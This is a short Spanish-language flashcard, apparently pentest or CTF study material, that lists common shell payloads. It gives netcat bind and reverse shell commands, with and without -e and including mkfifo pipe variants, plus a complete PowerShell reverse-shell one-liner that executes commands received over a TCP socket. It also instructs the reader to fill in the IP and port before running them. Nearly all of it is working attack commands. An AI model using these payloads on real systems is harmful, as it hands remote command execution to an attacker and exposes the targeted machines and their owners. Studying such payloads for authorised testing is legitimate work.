**Flashcard – Common Shell Payloads**

**Pregunta:** ¿Cuáles son comandos comunes para generar bind shells y reverse shells con Netcat y PowerShell?
**Respuesta:**

**Bind shell con Netcat (con `-e`):**

```bash
nc -lvnp <PUERTO> -e /bin/bash
```

**Bind shell sin `-e` (Linux moderno):**

```bash
mkfifo /tmp/f; nc -lvnp <PUERTO> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

**Reverse shell con Netcat (con `-e`):**

```bash
nc <IP_LOCAL> <PUERTO> -e /bin/bash
```

**Reverse shell sin `-e` (Linux moderno):**

```bash
mkfifo /tmp/f; nc <IP_LOCAL> <PUERTO> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

**Reverse shell en PowerShell (Windows Server):**

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PUERTO>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Reemplazar `<IP>` y `<PUERTO>` antes de ejecutar.

**Referencia útil:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) contiene variantes en múltiples lenguajes.
